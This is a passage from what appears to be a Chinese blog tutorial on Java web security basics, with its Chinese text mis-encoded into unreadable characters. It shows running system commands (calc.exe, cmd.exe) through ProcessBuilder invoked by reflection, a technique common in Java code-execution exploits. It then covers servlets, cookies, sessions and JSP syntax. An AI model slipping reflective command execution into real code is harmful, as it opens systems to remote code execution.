title="ProcessBuilderæ‰§è¡Œå‘½ä»¤çš„åå°„å®ç°"></a>ProcessBuilderæ‰§è¡Œå‘½ä»¤çš„åå°„å®ç°</h3><p>é™¤äº†Runtimeä»¥å¤–ï¼Œè¿˜å¯ä»¥ç”¨ProcessBuilderç±»æ¥æ‰§è¡Œå‘½ä»¤ã€‚<br>å®ƒçš„æ­£å¸¸æƒ…å†µä½¿ç”¨å¦‚ä¸‹.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder pb &#x3D; new ProcessBuilder(&quot;calc.exe&quot;);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ProcessBuilderçš„æ„é€ æ–¹æ³•ï¼Œå®ƒçš„æ„é€ æ–¹æ³•æœ‰å¾ˆå¤šä¸ªé‡è½½ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªå§ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151901.png" alt="QQæˆªå›¾20210219151901"></p><p>å¯è§ï¼ŒProcessBuilderçš„æ„é€ æ–¹æ³•æŠŠä¼ å…¥å‚æ•°ä¿å­˜åˆ°äº†commandå±æ€§é‡Œï¼Œç„¶åcommadä¼šè¢«ä»¥ç³»ç»Ÿå‘½ä»¤è°ƒç”¨ï¼ˆè¿™éƒ¨åˆ†ä»£ç å°±ä¸è´´å‡ºæ¥äº†ï¼‰ã€‚</p><p>é‚£ä¹ˆä»¥åå°„çš„å½¢å¼è¯¥å¦‚ä½•å®ç°å‘¢ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">            Method start &#x3D; clazz.getMethod(&quot;start&quot;);</span><br><span class="line">            start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cmd.exe&quot;))); </span><br></pre></td></tr></table></figure><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h3 id="Servletç”Ÿå‘½å‘¨æœŸ"><a href="#Servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Servletç”Ÿå‘½å‘¨æœŸ"></a>Servletç”Ÿå‘½å‘¨æœŸ</h3><h4 id="1-è°ƒç”¨init-æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–"><a href="#1-è°ƒç”¨init-æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–" class="headerlink" title="1.è°ƒç”¨init()æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–"></a>1.è°ƒç”¨init()æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–</h4><p>init()æ–¹æ³•åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºservletæ—¶è¢«è°ƒç”¨ï¼Œç”¨äºè¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void init() throws ServletException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="2-è°ƒç”¨service-æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚"><a href="#2-è°ƒç”¨service-æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚" class="headerlink" title="2.è°ƒç”¨service()æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚"></a>2.è°ƒç”¨service()æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚</h4><p>webæœåŠ¡å™¨ï¼Œå³servletå®¹å™¨è°ƒç”¨service()æ–¹æ³•å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶è¿”å›å“åº”ã€‚åŒæ—¶æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„ç±»å‹ï¼ˆGetï¼ŒPostï¼Œdeleteç­‰ï¼‰ï¼Œåšå‡ºä¸åŒçš„è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºæ˜¯ç”±serviceæ–¹æ³•æŠ½è±¡å‡ºçš„å…¶ä»–æ–¹æ³•ï¼ˆdoGetï¼ŒdoPostç­‰ï¼‰ã€‚<br>æ‰€ä»¥è¿™é‡Œè¯´çš„è°ƒç”¨service()æ–¹æ³•ä¹Ÿå°±æ˜¯ç­‰åŒäºè°ƒç”¨doGetï¼ŒdoPostç­‰æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">doPost,doDeleteç­‰æ–¹æ³•çš„å®šä¹‰å½¢åŒäºä¸‹</span><br><span class="line">public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="3-è°ƒç”¨distroy-åœ¨Servleté”€æ¯å‰å®Œæˆæ¸…ç†æ´»åŠ¨"><a href="#3-è°ƒç”¨distroy-åœ¨Servleté”€æ¯å‰å®Œæˆæ¸…ç†æ´»åŠ¨" class="headerlink" title="3.è°ƒç”¨distroy()åœ¨Servleté”€æ¯å‰å®Œæˆæ¸…ç†æ´»åŠ¨"></a>3.è°ƒç”¨distroy()åœ¨Servleté”€æ¯å‰å®Œæˆæ¸…ç†æ´»åŠ¨</h4><p>distrtoy()å‡½æ•°åªè°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨Servletè¢«é”€æ¯å‰å®Œæˆåå°çº¿ç¨‹åœæ­¢ï¼Œæ•°æ®åº“é“¾æ¥å…³é—­ç­‰ä¸€ç³»åˆ—æ¸…ç†å·¥ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void destroy() &#123;</span><br><span class="line">  &#x2F;&#x2F; ç»ˆæ­¢åŒ–ä»£ç ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¼–å†™ä¸€ä¸ªç®€å•çš„Servlet"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•çš„Servlet" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•çš„Servlet"></a>ç¼–å†™ä¸€ä¸ªç®€å•çš„Servlet</h3><p>æˆ‘ä»¬å†™ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥æ§åˆ¶Getè¯·æ±‚çš„å“åº”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)    &#x2F;&#x2F;ç”¨äºè®¾å®šè·¯ç”±</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request,</span><br><span class="line">                      HttpServletResponse response)</span><br><span class="line">            throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        out.println(&quot;&lt;h1&gt;&quot; + &quot;a&quot; + &quot;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³äºéƒ¨ç½²æˆ‘æ˜¯å‚è€ƒçš„è¿™ä¸ªæ–‡ç« <a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a><br>æˆ‘çš„ç‰ˆæœ¬æ—¶idea 2020.2ï¼Œå¯èƒ½ä¼šæœ‰å‡ºå…¥ã€‚</p><h3 id="å¤„ç†ä¼ å‚"><a href="#å¤„ç†ä¼ å‚" class="headerlink" title="å¤„ç†ä¼ å‚"></a>å¤„ç†ä¼ å‚</h3><p>servletå¤„ç†ä¼ å‚ä¸»è¦æ˜¯é€šè¿‡doGetå’ŒdoPostæ–¹æ³•è¿›è¡Œçš„ã€‚<br>æ¥æ”¶å‚æ•°å€¼ä¸»è¦æ˜¯é ä¸‹é¢çš„æ–¹æ³•</p><ul><li><strong>getParameter()ï¼š</strong>æ‚¨å¯ä»¥è°ƒç”¨ request.getParameter() æ–¹æ³•æ¥è·å–è¡¨å•å‚æ•°çš„å€¼ã€‚</li><li><strong>getParameterValues()ï¼š</strong>å¦‚æœå‚æ•°å‡ºç°ä¸€æ¬¡ä»¥ä¸Šï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå¹¶è¿”å›å¤šä¸ªå€¼ï¼Œä¾‹å¦‚å¤é€‰æ¡†ã€‚</li><li><strong>getParameterNames()ï¼š</strong>å¦‚æœæ‚¨æƒ³è¦å¾—åˆ°å½“å‰è¯·æ±‚ä¸­çš„æ‰€æœ‰å‚æ•°çš„å®Œæ•´åˆ—è¡¨ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ã€‚</li></ul><p>æˆ‘ä»¬å†™ä¸ªdemoè¯•è¯•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªdemoä¸»è¦ç”¨äºæ¥æ”¶getæ•°æ®ï¼Œå¹¶åšå‡ºä¸€äº›å¤„ç†è¿”å›.<br>é‚£ä¹ˆå¦‚ä½•æ¥æ”¶POSTæ•°æ®å‘¢ï¼Ÿå’ŒdoGetå·®ä¸å¤š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line">    </span><br><span class="line">    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;[Post]your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„request.getParameter(&quot;name&quot;)ä¼šä¼˜å…ˆé€‰æ‹©åœ¨urlé‡Œçš„å‚æ•°ï¼Œè€Œä¸æ˜¯httpåŒ…ä½“çš„å‚æ•°</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152111.png" alt="QQæˆªå›¾20210219152111"></p><h3 id="cookie-amp-session"><a href="#cookie-amp-session" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>cookieçš„ä¸»è¦æ–¹æ³•å¦‚ä¸‹</p><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³• &amp; æè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public void setDomain(String pattern)</strong> è¯¥æ–¹æ³•è®¾ç½® cookie é€‚ç”¨çš„åŸŸï¼Œä¾‹å¦‚ runoob.comã€‚</td></tr><tr><td align="left">2</td><td align="left"><strong>public String getDomain()</strong> è¯¥æ–¹æ³•è·å– cookie é€‚ç”¨çš„åŸŸï¼Œä¾‹å¦‚ runoob.comã€‚</td></tr><tr><td align="left">3</td><td align="left"><strong>public void setMaxAge(int expiry)</strong> è¯¥æ–¹æ³•è®¾ç½® cookie è¿‡æœŸçš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœä¸è¿™æ ·è®¾ç½®ï¼Œcookie åªä¼šåœ¨å½“å‰ session ä¼šè¯ä¸­æŒç»­æœ‰æ•ˆã€‚</td></tr><tr><td align="left">4</td><td align="left"><strong>public int getMaxAge()</strong> è¯¥æ–¹æ³•è¿”å› cookie çš„æœ€å¤§ç”Ÿå­˜å‘¨æœŸï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ-1 è¡¨ç¤º cookie å°†æŒç»­ä¸‹å»ï¼Œç›´åˆ°æµè§ˆå™¨å…³é—­ã€‚</td></tr><tr><td align="left">5</td><td align="left"><strong>public String getName()</strong> è¯¥æ–¹æ³•è¿”å› cookie çš„åç§°ã€‚åç§°åœ¨åˆ›å»ºåä¸èƒ½æ”¹å˜ã€‚</td></tr><tr><td align="left">6</td><td align="left"><strong>public void setValue(String newValue)</strong> è¯¥æ–¹æ³•è®¾ç½®ä¸ cookie å…³è”çš„å€¼ã€‚</td></tr><tr><td align="left">7</td><td align="left"><strong>public String getValue()</strong> è¯¥æ–¹æ³•è·å–ä¸ cookie å…³è”çš„å€¼ã€‚</td></tr><tr><td align="left">8</td><td align="left"><strong>public void setPath(String uri)</strong> è¯¥æ–¹æ³•è®¾ç½® cookie é€‚ç”¨çš„è·¯å¾„ã€‚å¦‚æœæ‚¨ä¸æŒ‡å®šè·¯å¾„ï¼Œä¸å½“å‰é¡µé¢ç›¸åŒç›®å½•ä¸‹çš„ï¼ˆåŒ…æ‹¬å­ç›®å½•ä¸‹çš„ï¼‰æ‰€æœ‰ URL éƒ½ä¼šè¿”å› cookieã€‚</td></tr><tr><td align="left">9</td><td align="left"><strong>public String getPath()</strong> è¯¥æ–¹æ³•è·å– cookie é€‚ç”¨çš„è·¯å¾„ã€‚</td></tr><tr><td align="left">10</td><td align="left"><strong>public void setSecure(boolean flag)</strong> è¯¥æ–¹æ³•è®¾ç½®å¸ƒå°”å€¼ï¼Œè¡¨ç¤º cookie æ˜¯å¦åº”è¯¥åªåœ¨åŠ å¯†çš„ï¼ˆå³ SSLï¼‰è¿æ¥ä¸Šå‘é€ã€‚</td></tr><tr><td align="left">11</td><td align="left"><strong>public void setComment(String purpose)</strong> è®¾ç½®cookieçš„æ³¨é‡Šã€‚è¯¥æ³¨é‡Šåœ¨æµè§ˆå™¨å‘ç”¨æˆ·å‘ˆç° cookie æ—¶éå¸¸æœ‰ç”¨ã€‚</td></tr><tr><td align="left">12</td><td align="left"><strong>public String getComment()</strong> è·å– cookie çš„æ³¨é‡Šï¼Œå¦‚æœ cookie æ²¡æœ‰æ³¨é‡Šåˆ™è¿”å› nullã€‚</td></tr></tbody></table><p>æˆ‘ä»¬é©¬ä¸Šå†™ä¸€ä¸ªdemoï¼Œè¿™ä¸ªdemoä¼šç”¨åˆ° response.addCookieç”¨äºåœ¨å“åº”å¤´é‡Œæ·»åŠ cookieï¼Œcookie.setMaxAge ç”¨äºè®¾ç½®cookieçš„æœ‰æ•ˆæœŸï¼Œrequest.getCookies ç”¨äºè·å–è¯·æ±‚é‡Œçš„cookieæ•°ç»„<br>è¿™é‡Œçš„demoæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªç”¨äºæ·»åŠ cookieï¼Œä¸€ä¸ªç”¨äºè¾“å‡ºcookie</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨äºæ·»åŠ cookie</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie name &#x3D; new Cookie(&quot;name&quot;, request.getParameter(&quot;name&quot;)); &#x2F;&#x2F; ä¸­æ–‡è½¬ç </span><br><span class="line"></span><br><span class="line">        name.setMaxAge(60*60*24);</span><br><span class="line"></span><br><span class="line">        response.addCookie( name );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡ºcookieå€¼</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;b&quot;)</span><br><span class="line">public class test2 extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie cookie &#x3D; null;</span><br><span class="line">        Cookie[] cookies &#x3D; null;</span><br><span class="line">        &#x2F;&#x2F; è·å–ä¸è¯¥åŸŸç›¸å…³çš„ Cookie çš„æ•°ç»„</span><br><span class="line">        cookies &#x3D; request.getCookies();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; è®¾ç½®å“åº”å†…å®¹ç±»å‹</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">            for (int i &#x3D; 0; i &lt; cookies.length; i++)&#123;</span><br><span class="line">                if((cookies[i].getName()).compareTo(&quot;name&quot;)&#x3D;&#x3D;0)&#123;</span><br><span class="line">                    out.println(&quot;your name is &quot;+cookies[i].getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152122.png" alt="QQæˆªå›¾20210219152122"></p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>servleæä¾›äº†ä¸€ç³»åˆ—sessionæ¥å£è¾…åŠ©è¿™ä¸ªæµç¨‹</p><table><thead><tr><th>1</th><th><strong>public Object getAttribute(String name)</strong> è¯¥æ–¹æ³•è¿”å›åœ¨è¯¥ session ä¼šè¯ä¸­å…·æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡ï¼Œåˆ™è¿”å› nullã€‚</th></tr></thead><tbody><tr><td>2</td><td><strong>public Enumeration getAttributeNames()</strong> è¯¥æ–¹æ³•è¿”å› String å¯¹è±¡çš„æšä¸¾ï¼ŒString å¯¹è±¡åŒ…å«æ‰€æœ‰ç»‘å®šåˆ°è¯¥ session ä¼šè¯çš„å¯¹è±¡çš„åç§°ã€‚</td></tr><tr><td>3</td><td><strong>public long getCreationTime()</strong> è¯¥æ–¹æ³•è¿”å›è¯¥ session ä¼šè¯è¢«åˆ›å»ºçš„æ—¶é—´ï¼Œè‡ªæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œç®—èµ·ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</td></tr><tr><td>4</td><td><strong>public String getId()</strong> è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å«åˆ†é…ç»™è¯¥ session ä¼šè¯çš„å”¯ä¸€æ ‡è¯†ç¬¦çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>5</td><td><strong>public long getLastAccessedTime()</strong> è¯¥æ–¹æ³•è¿”å›å®¢æˆ·ç«¯æœ€åä¸€æ¬¡å‘é€ä¸è¯¥ session ä¼šè¯ç›¸å…³çš„è¯·æ±‚çš„æ—¶é—´è‡ªæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œç®—èµ·ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</td></tr><tr><td>6</td><td><strong>public int getMaxInactiveInterval()</strong> è¯¥æ–¹æ³•è¿”å› Servlet å®¹å™¨åœ¨å®¢æˆ·ç«¯è®¿é—®æ—¶ä¿æŒ session ä¼šè¯æ‰“å¼€çš„æœ€å¤§æ—¶é—´é—´éš”ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚</td></tr><tr><td>7</td><td><strong>public void invalidate()</strong> è¯¥æ–¹æ³•æŒ‡ç¤ºè¯¥ session ä¼šè¯æ— æ•ˆï¼Œå¹¶è§£é™¤ç»‘å®šåˆ°å®ƒä¸Šé¢çš„ä»»ä½•å¯¹è±¡ã€‚</td></tr><tr><td>8</td><td><strong>public boolean isNew()</strong> å¦‚æœå®¢æˆ·ç«¯è¿˜ä¸çŸ¥é“è¯¥ session ä¼šè¯ï¼Œæˆ–è€…å¦‚æœå®¢æˆ·é€‰æ‹©ä¸å‚å…¥è¯¥ session ä¼šè¯ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› trueã€‚</td></tr><tr><td>9</td><td><strong>public void removeAttribute(String name)</strong> è¯¥æ–¹æ³•å°†ä»è¯¥ session ä¼šè¯ç§»é™¤æŒ‡å®šåç§°çš„å¯¹è±¡ã€‚</td></tr><tr><td>10</td><td><strong>public void setAttribute(String name, Object value)</strong> è¯¥æ–¹æ³•ä½¿ç”¨æŒ‡å®šçš„åç§°ç»‘å®šä¸€ä¸ªå¯¹è±¡åˆ°è¯¥ session ä¼šè¯ã€‚</td></tr><tr><td>11</td><td><strong>public void setMaxInactiveInterval(int interval)</strong> è¯¥æ–¹æ³•åœ¨ Servlet å®¹å™¨æŒ‡ç¤ºè¯¥ session ä¼šè¯æ— æ•ˆä¹‹å‰ï¼ŒæŒ‡å®šå®¢æˆ·ç«¯è¯·æ±‚ä¹‹é—´çš„æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚</td></tr></tbody></table><p>å†™ä¸ªdemoå§ï¼Œè¿‡ä¸€è¿‡å°±è¡Œäº†</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.text.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        HttpSession session &#x3D; request.getSession(); &#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsessionå¯¹è±¡</span><br><span class="line">        Date createtime &#x3D; new Date(session.getCreationTime());</span><br><span class="line">        Date lastAccessTime &#x3D; new Date(session.getLastAccessedTime());</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line"></span><br><span class="line">        SimpleDateFormat df &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd:mm:ss&quot;);</span><br><span class="line">        String countkey &#x3D; new String(&quot;key&quot;);  &#x2F;&#x2F;è®¿é—®æ¬¡æ•°çš„é”®</span><br><span class="line">        Integer count &#x3D; Integer.valueOf(0);   &#x2F;&#x2F;è®¿é—®æ¬¡æ•°çš„å€¼</span><br><span class="line">        String userID &#x3D; new String(&quot;Tom&quot;);    &#x2F;&#x2F;ç”¨æˆ·IDçš„å€¼</span><br><span class="line">        String userIDKey &#x3D; new String(&quot;userIDKey&quot;);   &#x2F;&#x2F;ç”¨æˆ·IDçš„é”®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(session.getAttribute(countkey)&#x3D;&#x3D;null)&#123;   &#x2F;&#x2F;å¦‚æœè·å¾—è¯¥sessionçš„countkeyè¿™ä¸ªé”®çš„å€¼ä¸å­˜åœ¨æ—¶ï¼Œä¸ºå½“å‰sessionåˆå§‹åŒ–è¿™ä¸ªé”®</span><br><span class="line">            session.setAttribute(countkey,Integer.valueOf(0));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(session.isNew())&#123;   &#x2F;&#x2F;å¦‚æœsessionæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œåˆ™ä¸ºå…¶åˆå§‹åŒ–userIDé”®</span><br><span class="line">            session.setAttribute(userIDKey,userID);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            count &#x3D; (Integer) session.getAttribute(countkey);</span><br><span class="line">            count &#x3D; count+1;</span><br><span class="line">            userID &#x3D; (String)session.getAttribute(userIDKey);</span><br><span class="line">        &#125;</span><br><span class="line">        session.setAttribute(countkey,count);</span><br><span class="line">        out.println(&quot;hello&quot;+userID+&quot;\nthis is the &quot;+count+&quot; to visit this website\n&quot;);</span><br><span class="line">        out.println(&quot;first time:&quot;+createtime+&quot;\n this time:&quot;+lastAccessTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h3 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h3><p>JSPæ˜¯è„šæœ¬è¯­è¨€ï¼Œä¸PHPç­‰è¯­è¨€ç±»ä¼¼ã€‚JSPæœ¬è´¨å°±æ˜¯servletï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰å°±æ˜¯ç®€åŒ–servletå¤æ‚çš„ç¨‹åºè¿‡ç¨‹</p><h3 id="JSPåŸºç¡€è¯­æ³•"><a href="#JSPåŸºç¡€è¯­æ³•" class="headerlink" title="JSPåŸºç¡€è¯­æ³•"></a>JSPåŸºç¡€è¯­æ³•</h3><h4 id="ä»£ç æ®µ"><a href="#ä»£ç æ®µ" class="headerlink" title="ä»£ç æ®µ"></a>ä»£ç æ®µ</h4><p>JSPå’ŒPHPç­‰å¯ä»¥åµŒå…¥åˆ°HTMLçš„è„šæœ¬è¯­è¨€ç±»ä¼¼ï¼Œéœ€è¦ç”¨ä¸€ä¸ªä»£ç æ®µåŒ…è£¹ä»£ç ã€‚<br>å…¶æ ¼å¼å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% code %&gt;</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ä»£ç æ®µä¸­è¿˜å­˜åœ¨ç€æŒ‡ä»¤æ ‡ç­¾:Page,include,taglib<br>ä»–ä»¬çš„å®šä¹‰å’Œä½œç”¨å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page ...... %&gt;    </span><br><span class="line">pageæŒ‡ä»¤ç”¨äºå®šä¹‰ç½‘é¡µçš„å„å±æ€§ï¼Œå¦‚&lt;%@ page import&#x3D;&quot;...&quot; %&gt; è¡¨ç¤ºè¦å¯¼å…¥å“ªäº›javaæ¨¡å—,&lt;%@ page language&#x3D;&quot;...&quot; %&gt;è¡¨ç¤ºJSPé¡µé¢æ‰€ç”¨çš„è¯­è¨€ï¼Œé»˜è®¤æ˜¯java</span><br><span class="line"></span><br><span class="line">&lt;%@ include file&#x3D;&quot;æ–‡ä»¶ç›¸å¯¹urlåœ°å€&quot; %&gt; è¡¨ç¤ºè¦åŒ…å«å“ªäº›å…¶ä»–æ–‡ä»¶ï¼Œå¯ä»¥åŒ…å«JSP,HTMLæˆ–txtç­‰æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">&lt;%@ taglib ......%&gt;  ä¸»è¦ç”¨äºç”¨æˆ·è‡ªå®šä¹‰æ ‡ç­¾ </span><br></pre></td></tr></table></figure><h4 id="åŠ¨ä½œå…ƒç´ "><a href="#åŠ¨ä½œå…ƒç´ " class="headerlink" title="åŠ¨ä½œå…ƒç´ "></a>åŠ¨ä½œå…ƒç´ </h4><p>ä¸æŒ‡ä»¤å…ƒç´ æ¯”è¾ƒç›¸ä¼¼ï¼Œä½†ä¸åŒçš„æ˜¯åŠ¨ä½œå…ƒç´ å¯ä»¥åŠ¨æ€çš„æ’å…¥ï¼Œä¸åƒæŒ‡ä»¤å…ƒç´ ä¸€æ ·ä¸€å¼€å¤´å°±ä¼šè¢«æ‰§è¡Œã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152132.png" alt="QQæˆªå›¾20210219152132"></p><h4 id="ä¹å¤§å¯¹è±¡"><a href="#ä¹å¤§å¯¹è±¡" class="headerlink" title="ä¹å¤§å¯¹è±¡"></a>ä¹å¤§å¯¹è±¡</h4><p>JSPä¸­æœ‰ä¹å¤§å¯¹è±¡ç”¨äºå®ç°å„ç§æ“ä½œã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152143.png" 